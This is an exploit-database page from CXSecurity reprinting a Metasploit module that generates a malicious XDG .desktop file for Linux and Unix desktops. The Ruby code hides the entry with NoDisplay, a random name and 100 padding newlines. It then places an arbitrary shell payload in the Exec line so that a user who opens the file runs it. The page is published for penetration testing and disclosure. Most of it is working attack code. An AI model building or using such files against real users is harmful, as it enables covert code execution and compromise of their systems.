---
title: Malicious XDG Desktop File
url: https://cxsecurity.com/issue/WLB-2025080005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-06
fetch_date: 2025-10-07T00:17:47.649751
---

# Malicious XDG Desktop File

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Malicious XDG Desktop File** **2025.08.05**  Credit:  **[Brendan coles](https://cxsecurity.com/author/Brendan%2Bcoles/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = GreatRanking
include Msf::Exploit::FILEFORMAT
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Malicious XDG Desktop File',
'Description' => %q{
This module creates a malicious XDG Desktop (.desktop) file.
On most modern systems, desktop files are not trusted by default.
The user will receive a warning prompt that the file is not trusted
when running the file, but may choose to run the file anyway.
The default file manager applications in some desktop environments
may impose more strict execution requirements by prompting the user
to set the file as executable and/or marking the file as trusted
before the file can be executed.
},
'Author' => [
'bcoles'
],
'License' => MSF\_LICENSE,
'References' => [
['ATT&CK', Mitre::Attack::Technique::T1204\_002\_MALICIOUS\_FILE],
['URL', 'https://specifications.freedesktop.org/desktop-entry-spec/latest/'],
['URL', 'https://specifications.freedesktop.org/desktop-entry-spec/latest/exec-variables.html'],
['URL', 'https://wiki.archlinux.org/title/Desktop\_entries']
],
'Platform' => %w[linux unix solaris freebsd],
'Arch' => [ARCH\_CMD],
'Targets' => [
[ 'Automatic', {} ]
],
'DefaultTarget' => 0,
'Privileged' => false,
'DisclosureDate' => '2007-02-06',
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [SCREEN\_EFFECTS]
}
)
)
register\_options([
OptString.new('FILENAME', [true, 'The desktop file name.', 'msf.desktop']),
OptString.new('APPLICATION\_NAME', [false, 'The application name. Some file managers will display this name instead of the file name. (default is random)', '']),
])
register\_advanced\_options([
OptInt.new('PrependNewLines', [false, 'Prepend new lines before the payload.', 100]),
])
end
def application\_name
datastore['APPLICATION\_NAME'].blank? ? rand\_text\_alpha(6..12) : datastore['APPLICATION\_NAME']
end
def exploit
values = [
'Type=Application',
"Name=#{application\_name}",
# 'Hidden=true', # This property is not supported by old systems, which prevents execution
'NoDisplay=true',
'Terminal=false'
]
desktop = "[Desktop Entry]\n"
desktop << values.shuffle.join("\n")
desktop << "\n"
desktop << "\n" \* datastore['PrependNewLines']
escaped\_payload = payload.encoded.gsub('\\', '\\\\\\').gsub('"', '\\"')
desktop << "Exec=/bin/sh -c \"#{escaped\_payload}\""
file\_create(desktop)
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top